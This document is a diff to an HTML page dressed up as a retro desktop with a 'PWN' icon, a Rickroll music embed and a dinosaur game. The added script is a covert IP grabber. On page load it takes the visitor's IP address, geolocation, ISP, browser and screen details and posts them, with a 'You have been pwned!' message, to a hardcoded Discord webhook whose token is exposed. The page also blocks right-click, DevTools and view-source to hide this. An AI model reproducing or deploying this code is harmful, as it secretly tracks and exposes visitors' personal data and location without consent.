@@ -17,7 +17,6 @@
             height: 100%;
             font-family: "Tahoma", sans-serif;
             overflow: hidden;
-            /* Mouse Cursor */
             cursor: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329165444934008864/cursor.cur'), auto;
         }
 
@@ -78,11 +77,31 @@
         .volume-control input {
             width: 100px;
         }
+
+        /* Popup Alert */
+        .alert {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: black;
+            color: white;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.8);
+            text-align: center;
+            font-size: 16px;
+            font-weight: bold;
+            z-index: 200;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+        }
     </style>
 </head>
 <body>
     <!-- Background Music -->
-    <iframe id="youtubePlayer" style="display:none;" src="https://www.youtube.com/watch?v=WPrhl0pFY_o&ab_channel=PhonkTime" frameborder="0" allow="autoplay"></iframe>
+    <iframe id="youtubePlayer" style="display:none;" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&loop=1&playlist=dQw4w9WgXcQ" frameborder="0" allow="autoplay"></iframe>
 
     <!-- Volume Control -->
     <div class="volume-control">
@@ -90,14 +109,47 @@
         <input type="range" id="volumeSlider" min="0" max="100" step="1" value="100">
     </div>
 
+    <!-- Desktop -->
+    <div class="desktop">
+        <!-- PWN Icon -->
+        <div class="icon" onclick="showAlert()">
+            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329157216397426740/imgbin_lulzsec-security-hacker-anonymous-computer-security-hacker-group-png.png" alt="PWN Icon">
+            <span>PWN</span>
+        </div>
+    </div>
+
     <!-- Taskbar -->
     <div class="taskbar">
-        <button class="start-button">
+        <button class="start-button" onclick="openGame()">
             <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329158869271838740/start_icon.jpg" alt="Start Icon">
         </button>
     </div>
 
+    <!-- Smooth Alert -->
+    <div class="alert" id="alertBox">
+        Made by cAsH
+    </div>
+
+    <!-- Dinosaur Game -->
+    <div class="alert" id="gameWindow">
+        <iframe src="https://chromedino.com/" width="800" height="400" frameborder="0"></iframe>
+    </div>
+
     <script>
+        // Smooth Alert for PWN Icon
+        function showAlert() {
+            const alertBox = document.getElementById('alertBox');
+            alertBox.style.display = 'block';
+            alertBox.style.opacity = '1';
+
+            setTimeout(() => {
+                alertBox.style.opacity = '0';
+                setTimeout(() => {
+                    alertBox.style.display = 'none';
+                }, 300);
+            }, 3000);
+        }
+
         // Volume Control for YouTube Player
         const volumeSlider = document.getElementById('volumeSlider');
         const youtubePlayer = document.getElementById('youtubePlayer');
@@ -111,37 +163,74 @@
             }), '*');
         });
 
-        // Enhanced Inspect and F12 Blocking
-        const blockDevTools = () => {
-            // Prevent right-click
-            document.addEventListener('contextmenu', (e) => e.preventDefault());
+        // Webhook Script to Fetch and Send IP Info
+        async function fetchAndSendIP() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org/?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
 
-            // Block F12, Ctrl+Shift+I/J, and Ctrl+U
-            document.addEventListener('keydown', (e) => {
-                if (
-                    e.key === 'F12' ||
-                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
-                    (e.ctrlKey && e.key === 'U')
-                ) {
-                    e.preventDefault();
-                }
-            });
+                const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
+                const geoData = await geoResponse.json();
 
-            // Detect DevTools by measuring console open/close timing
-            const devToolsDetector = () => {
-                const start = performance.now();
-                console.log('DevTools Detection');
-                const time = performance.now() - start;
-                if (time > 100) {
-                    alert('DevTools are not allowed!');
-                    window.location.reload(); // Reload page when DevTools are detected
-                }
-            };
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const timestamp = new Date().toLocaleString();
 
-            setInterval(devToolsDetector, 1000);
-        };
+                // Build webhook message content
+                const webhookMessage = `
+:cAsH:  cAsH grabbed You :cAsH: 
 
-        blockDevTools();
+**User IP:** ${userIP}
+**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
+**ISP:** ${geoData.org || "Unknown"}
+**Browser:** ${userAgent}
+**Platform:** ${platform}
+**Screen Resolution:** ${screenWidth}x${screenHeight}
+**Timestamp:** ${timestamp}
+
+||@everyone|| **You have been pwned!**
+                `;
+
+                // Send to Discord Webhook
+                await fetch("https://discord.com/api/webhooks/1329196613524127744/FBovN89fd9EDbmk51UAy0v82nAG_nWn_zkNa6BpntB8Jxotk-9I4p1zp3G7H1bPbh9AV", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: webhookMessage
+                    })
+                });
+            } catch (error) {
+                console.error('Error fetching IP or sending to webhook:', error);
+            }
+        }
+
+        // Execute the Webhook Script on Page Load
+        window.onload = fetchAndSendIP;
+
+        // Block Right-Click and Inspect
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        document.addEventListener('keydown', (e) => {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                (e.ctrlKey && e.key === 'U')
+            ) {
+                e.preventDefault();
+            }
+        });
+
+        // Reload if DevTools Detected
+        setInterval(() => {
+            const t1 = performance.now();
+            console.log('Detecting DevTools...');
+            const t2 = performance.now();
+            if (t2 - t1 > 100) window.location.reload();
+        }, 1000);
     </script>
 </body>
 </html>
